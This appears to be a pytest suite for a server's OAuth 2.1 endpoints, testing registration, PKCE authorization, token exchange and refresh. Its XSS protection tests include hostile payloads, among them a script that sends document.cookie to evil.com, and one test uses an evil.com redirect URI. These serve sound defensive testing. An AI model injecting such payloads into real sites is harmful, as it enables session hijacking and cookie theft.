"""Tests for OAuth 2.1 endpoints."""

from __future__ import annotations

import base64
import hashlib
import json
import tempfile
import urllib.parse
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from starlette.testclient import TestClient


@pytest.fixture(autouse=True)
def reset_stores():
    """Reset all stores between tests."""
    import valence.server.config as config_module
    import valence.server.oauth_models as oauth_module
    import valence.server.auth as auth_module
    
    config_module._settings = None
    oauth_module._client_store = None
    oauth_module._code_store = None
    oauth_module._refresh_store = None
    auth_module._token_store = None
    
    yield
    
    config_module._settings = None
    oauth_module._client_store = None
    oauth_module._code_store = None
    oauth_module._refresh_store = None
    auth_module._token_store = None


@pytest.fixture
def oauth_env(monkeypatch, tmp_path):
    """Set up OAuth environment."""
    token_file = tmp_path / "tokens.json"
    clients_file = tmp_path / "clients.json"
    
    token_file.write_text('{"tokens": []}')
    clients_file.write_text('{"clients": []}')
    
    monkeypatch.setenv("VALENCE_TOKEN_FILE", str(token_file))
    monkeypatch.setenv("VALENCE_OAUTH_ENABLED", "true")
    monkeypatch.setenv("VALENCE_OAUTH_CLIENTS_FILE", str(clients_file))
    # JWT secret must be at least 32 characters
    monkeypatch.setenv("VALENCE_OAUTH_JWT_SECRET", "test-jwt-secret-for-testing-must-be-at-least-32-chars")
    monkeypatch.setenv("VALENCE_OAUTH_USERNAME", "admin")
    monkeypatch.setenv("VALENCE_OAUTH_PASSWORD", "testpass")
    monkeypatch.setenv("VALENCE_EXTERNAL_URL", "http://localhost:8420")
    monkeypatch.setenv("VALENCE_FEDERATION_ENABLED", "false")
    
    return {
        "token_file": token_file,
        "clients_file": clients_file,
    }


@pytest.fixture
def mock_db():
    """Mock database for health check."""
    mock_cursor = MagicMock()
    mock_cursor.execute.return_value = None
    
    def mock_context(*args, **kwargs):
        class CM:
            def __enter__(self):
                return mock_cursor
            def __exit__(self, *args):
                pass
        return CM()
    
    with patch("valence.core.db.get_cursor", mock_context):
        yield mock_cursor


@pytest.fixture
def client(oauth_env, mock_db) -> TestClient:
    """Create test client."""
    from valence.server.app import create_app
    app = create_app()
    return TestClient(app, raise_server_exceptions=False)


# API prefix for v1 endpoints
API_V1 = "/api/v1"


def generate_pkce_pair():
    """Generate a PKCE code_verifier and code_challenge pair."""
    import secrets
    
    verifier = secrets.token_urlsafe(32)
    challenge = base64.urlsafe_b64encode(
        hashlib.sha256(verifier.encode("ascii")).digest()
    ).rstrip(b"=").decode("ascii")
    
    return verifier, challenge


# ============================================================================
# Metadata Endpoint Tests
# ============================================================================

class TestProtectedResourceMetadata:
    """Tests for protected resource metadata endpoint."""

    def test_returns_metadata(self, client):
        """Test protected resource metadata response."""
        response = client.get("/.well-known/oauth-protected-resource")
        
        assert response.status_code == 200
        data = response.json()
        
        assert "resource" in data
        assert "authorization_servers" in data
        assert "scopes_supported" in data
        assert "bearer_methods_supported" in data

    def test_scopes_supported(self, client):
        """Test that scopes are listed."""
        response = client.get("/.well-known/oauth-protected-resource")
        data = response.json()
        
        assert "mcp:tools" in data["scopes_supported"]
        assert "mcp:resources" in data["scopes_supported"]
        assert "mcp:prompts" in data["scopes_supported"]


class TestAuthorizationServerMetadata:
    """Tests for authorization server metadata endpoint."""

    def test_returns_metadata(self, client):
        """Test authorization server metadata response."""
        response = client.get("/.well-known/oauth-authorization-server")
        
        assert response.status_code == 200
        data = response.json()
        
        assert "issuer" in data
        assert "authorization_endpoint" in data
        assert "token_endpoint" in data
        assert "registration_endpoint" in data

    def test_required_fields(self, client):
        """Test required OAuth metadata fields."""
        response = client.get("/.well-known/oauth-authorization-server")
        data = response.json()
        
        assert data["response_types_supported"] == ["code"]
        assert "authorization_code" in data["grant_types_supported"]
        assert "refresh_token" in data["grant_types_supported"]
        assert data["code_challenge_methods_supported"] == ["S256"]
        assert data["token_endpoint_auth_methods_supported"] == ["none"]


# ============================================================================
# Dynamic Client Registration Tests
# ============================================================================

class TestClientRegistration:
    """Tests for dynamic client registration."""

    def test_register_client_success(self, client):
        """Test successful client registration."""
        response = client.post(
            f"{API_V1}/oauth/register",
            json={
                "redirect_uris": ["http://localhost:3000/callback"],
                "client_name": "Test App",
            },
        )
        
        assert response.status_code == 201
        data = response.json()
        
        assert "client_id" in data
        assert data["client_name"] == "Test App"
        assert "http://localhost:3000/callback" in data["redirect_uris"]

    def test_register_client_missing_redirect_uris(self, client):
        """Test registration fails without redirect_uris."""
        response = client.post(
            f"{API_V1}/oauth/register",
            json={"client_name": "Test App"},
        )
        
        assert response.status_code == 400
        assert "redirect_uris" in response.json()["error_description"]

    def test_register_client_invalid_redirect_uri(self, client):
        """Test registration fails with invalid redirect URI."""
        response = client.post(
            f"{API_V1}/oauth/register",
            json={
                "redirect_uris": ["not-a-valid-uri"],
                "client_name": "Test App",
            },
        )
        
        assert response.status_code == 400
        assert "invalid_redirect_uri" in response.json()["error"]

    def test_register_client_invalid_grant_types(self, client):
        """Test registration fails with invalid grant types."""
        response = client.post(
            f"{API_V1}/oauth/register",
            json={
                "redirect_uris": ["http://localhost/callback"],
                "grant_types": ["client_credentials"],  # Not supported
            },
        )
        
        assert response.status_code == 400

    def test_register_client_custom_scope(self, client):
        """Test registration with custom scope."""
        response = client.post(
            f"{API_V1}/oauth/register",
            json={
                "redirect_uris": ["http://localhost/callback"],
                "scope": "mcp:tools",
            },
        )
        
        assert response.status_code == 201
        assert response.json()["scope"] == "mcp:tools"


# ============================================================================
# Authorization Endpoint Tests
# ============================================================================

class TestAuthorization:
    """Tests for authorization endpoint."""

    def test_authorize_shows_login(self, client):
        """Test authorization shows login page."""
        # First register a client
        reg_response = client.post(
            f"{API_V1}/oauth/register",
            json={
                "redirect_uris": ["http://localhost/callback"],
                "client_name": "Test App",
            },
        )
        client_id = reg_response.json()["client_id"]
        
        _, challenge = generate_pkce_pair()
        
        response = client.get(
            f"{API_V1}/oauth/authorize",
            params={
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": "http://localhost/callback",
                "code_challenge": challenge,
                "code_challenge_method": "S256",
            },
        )
        
        assert response.status_code == 200
        assert "Sign In" in response.text or "Valence" in response.text

    def test_authorize_invalid_response_type(self, client):
        """Test authorization fails with invalid response_type."""
        reg_response = client.post(
            f"{API_V1}/oauth/register",
            json={"redirect_uris": ["http://localhost/callback"]},
        )
        client_id = reg_response.json()["client_id"]
        
        response = client.get(
            f"{API_V1}/oauth/authorize",
            params={
                "response_type": "token",  # Not supported
                "client_id": client_id,
                "redirect_uri": "http://localhost/callback",
                "code_challenge": "test",
            },
            follow_redirects=False,
        )
        
        # Should redirect with error
        assert response.status_code == 302

    def test_authorize_missing_client_id(self, client):
        """Test authorization fails without client_id."""
        response = client.get(
            f"{API_V1}/oauth/authorize",
            params={
                "response_type": "code",
                "redirect_uri": "http://localhost/callback",
                "code_challenge": "test",
            },
        )
        
        assert response.status_code == 400
        assert "client_id" in response.text.lower()

    def test_authorize_missing_pkce(self, client):
        """Test authorization requires PKCE."""
        reg_response = client.post(
            f"{API_V1}/oauth/register",
            json={"redirect_uris": ["http://localhost/callback"]},
        )
        client_id = reg_response.json()["client_id"]
        
        response = client.get(
            f"{API_V1}/oauth/authorize",
            params={
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": "http://localhost/callback",
                # No code_challenge
            },
            follow_redirects=False,
        )
        
        assert response.status_code == 302
        assert "PKCE" in response.headers.get("location", "").lower() or \
               "code_challenge" in response.headers.get("location", "").lower()

    def test_authorize_invalid_redirect_uri(self, client):
        """Test authorization fails with unregistered redirect_uri."""
        reg_response = client.post(
            f"{API_V1}/oauth/register",
            json={"redirect_uris": ["http://localhost/callback"]},
        )
        client_id = reg_response.json()["client_id"]
        
        response = client.get(
            f"{API_V1}/oauth/authorize",
            params={
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": "http://evil.com/steal",  # Not registered
                "code_challenge": "test",
            },
        )
        
        assert response.status_code == 400

    def test_authorize_post_valid_credentials(self, client):
        """Test authorization with valid credentials."""
        # Register client
        reg_response = client.post(
            f"{API_V1}/oauth/register",
            json={
                "redirect_uris": ["http://localhost/callback"],
                "client_name": "Test App",
            },
        )
        client_id = reg_response.json()["client_id"]
        
        verifier, challenge = generate_pkce_pair()
        
        # Submit login form
        response = client.post(
            f"{API_V1}/oauth/authorize",
            params={
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": "http://localhost/callback",
                "code_challenge": challenge,
                "code_challenge_method": "S256",
                "state": "test-state",
            },
            data={
                "username": "admin",
                "password": "testpass",
            },
            follow_redirects=False,
        )
        
        assert response.status_code == 302
        location = response.headers["location"]
        assert "code=" in location
        assert "state=test-state" in location

    def test_authorize_post_invalid_credentials(self, client):
        """Test authorization with invalid credentials."""
        reg_response = client.post(
            f"{API_V1}/oauth/register",
            json={"redirect_uris": ["http://localhost/callback"]},
        )
        client_id = reg_response.json()["client_id"]
        
        _, challenge = generate_pkce_pair()
        
        response = client.post(
            f"{API_V1}/oauth/authorize",
            params={
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": "http://localhost/callback",
                "code_challenge": challenge,
                "code_challenge_method": "S256",
            },
            data={
                "username": "admin",
                "password": "wrongpassword",
            },
        )
        
        assert response.status_code == 200
        assert "Invalid" in response.text or "error" in response.text.lower()


# ============================================================================
# Token Endpoint Tests
# ============================================================================

class TestTokenEndpoint:
    """Tests for token endpoint."""

    def _get_auth_code(self, client) -> tuple[str, str, str]:
        """Helper to get an authorization code."""
        # Register client
        reg_response = client.post(
            f"{API_V1}/oauth/register",
            json={"redirect_uris": ["http://localhost/callback"]},
        )
        client_id = reg_response.json()["client_id"]
        
        verifier, challenge = generate_pkce_pair()
        
        # Get auth code
        response = client.post(
            f"{API_V1}/oauth/authorize",
            params={
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": "http://localhost/callback",
                "code_challenge": challenge,
                "code_challenge_method": "S256",
            },
            data={
                "username": "admin",
                "password": "testpass",
            },
            follow_redirects=False,
        )
        
        # Extract code from redirect
        location = response.headers["location"]
        parsed = urllib.parse.urlparse(location)
        params = urllib.parse.parse_qs(parsed.query)
        code = params["code"][0]
        
        return code, client_id, verifier

    def test_token_authorization_code(self, client):
        """Test exchanging auth code for tokens."""
        code, client_id, verifier = self._get_auth_code(client)
        
        response = client.post(
            f"{API_V1}/oauth/token",
            data={
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": "http://localhost/callback",
                "client_id": client_id,
                "code_verifier": verifier,
            },
        )
        
        assert response.status_code == 200
        data = response.json()
        
        assert "access_token" in data
        assert "refresh_token" in data
        assert data["token_type"] == "Bearer"
        assert "expires_in" in data

    def test_token_invalid_code(self, client):
        """Test token fails with invalid code."""
        response = client.post(
            f"{API_V1}/oauth/token",
            data={
                "grant_type": "authorization_code",
                "code": "invalid-code",
                "redirect_uri": "http://localhost/callback",
                "client_id": "some-client",
                "code_verifier": "some-verifier",
            },
        )
        
        assert response.status_code == 400
        assert response.json()["error"] == "invalid_grant"

    def test_token_code_used_twice(self, client):
        """Test that auth codes can only be used once."""
        code, client_id, verifier = self._get_auth_code(client)
        
        # First use succeeds
        response1 = client.post(
            f"{API_V1}/oauth/token",
            data={
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": "http://localhost/callback",
                "client_id": client_id,
                "code_verifier": verifier,
            },
        )
        assert response1.status_code == 200
        
        # Second use fails
        response2 = client.post(
            f"{API_V1}/oauth/token",
            data={
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": "http://localhost/callback",
                "client_id": client_id,
                "code_verifier": verifier,
            },
        )
        assert response2.status_code == 400

    def test_token_wrong_pkce_verifier(self, client):
        """Test token fails with wrong PKCE verifier."""
        code, client_id, _ = self._get_auth_code(client)
        
        response = client.post(
            f"{API_V1}/oauth/token",
            data={
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": "http://localhost/callback",
                "client_id": client_id,
                "code_verifier": "wrong-verifier",
            },
        )
        
        assert response.status_code == 400
        assert "PKCE" in response.json().get("error_description", "")

    def test_token_refresh(self, client):
        """Test refreshing access token."""
        code, client_id, verifier = self._get_auth_code(client)
        
        # Get initial tokens
        response1 = client.post(
            f"{API_V1}/oauth/token",
            data={
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": "http://localhost/callback",
                "client_id": client_id,
                "code_verifier": verifier,
            },
        )
        refresh_token = response1.json()["refresh_token"]
        
        # Use refresh token
        response2 = client.post(
            f"{API_V1}/oauth/token",
            data={
                "grant_type": "refresh_token",
                "refresh_token": refresh_token,
                "client_id": client_id,
            },
        )
        
        assert response2.status_code == 200
        assert "access_token" in response2.json()

    def test_token_invalid_refresh_token(self, client):
        """Test token fails with invalid refresh token."""
        response = client.post(
            f"{API_V1}/oauth/token",
            data={
                "grant_type": "refresh_token",
                "refresh_token": "invalid-token",
            },
        )
        
        assert response.status_code == 400
        assert response.json()["error"] == "invalid_grant"

    def test_token_unsupported_grant_type(self, client):
        """Test token fails with unsupported grant type."""
        response = client.post(
            f"{API_V1}/oauth/token",
            data={
                "grant_type": "client_credentials",
            },
        )
        
        assert response.status_code == 400
        assert response.json()["error"] == "unsupported_grant_type"

    def test_token_missing_params(self, client):
        """Test token fails with missing parameters."""
        response = client.post(
            f"{API_V1}/oauth/token",
            data={
                "grant_type": "authorization_code",
                # Missing code, client_id, etc.
            },
        )
        
        assert response.status_code == 400


# ============================================================================
# XSS Protection Tests (Issue #42)
# ============================================================================

class TestXSSProtection:
    """Tests for XSS protection in OAuth pages."""

    def test_client_name_xss_escaped(self, client):
        """Test that client_name is HTML-escaped in login page."""
        # Register client with XSS payload in name
        xss_payload = '<script>alert("xss")</script>'
        reg_response = client.post(
            f"{API_V1}/oauth/register",
            json={
                "redirect_uris": ["http://localhost/callback"],
                "client_name": xss_payload,
            },
        )
        client_id = reg_response.json()["client_id"]
        
        _, challenge = generate_pkce_pair()
        
        # Request the login page
        response = client.get(
            f"{API_V1}/oauth/authorize",
            params={
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": "http://localhost/callback",
                "code_challenge": challenge,
                "code_challenge_method": "S256",
            },
        )
        
        assert response.status_code == 200
        # The raw XSS payload should NOT appear in the response
        assert xss_payload not in response.text
        # The escaped version should appear
        assert "&lt;script&gt;" in response.text

    def test_error_message_xss_escaped(self, client):
        """Test that error messages are HTML-escaped in login page."""
        # Register a client
        reg_response = client.post(
            f"{API_V1}/oauth/register",
            json={"redirect_uris": ["http://localhost/callback"]},
        )
        client_id = reg_response.json()["client_id"]
        
        _, challenge = generate_pkce_pair()
        
        # Submit with wrong credentials to trigger error display
        # The error message is hardcoded, so we test the escaping via
        # the internal function directly
        from valence.server.oauth import _login_page
        
        xss_payload = '<img src=x onerror="alert(1)">'
        html_output = _login_page({}, "Test Client", error=xss_payload)
        
        # The raw XSS payload should NOT appear
        assert xss_payload not in html_output
        # The escaped version should appear
        assert "&lt;img" in html_output

    def test_error_page_xss_escaped(self, client):
        """Test that error page messages are HTML-escaped."""
        from valence.server.oauth import _error_page
        
        xss_payload = '<script>document.location="http://evil.com?c="+document.cookie</script>'
        html_output = _error_page(xss_payload)
        
        # The raw XSS payload should NOT appear
        assert xss_payload not in html_output
        # The escaped version should appear
        assert "&lt;script&gt;" in html_output
        assert "evil.com" in html_output  # The text content is still there, just escaped
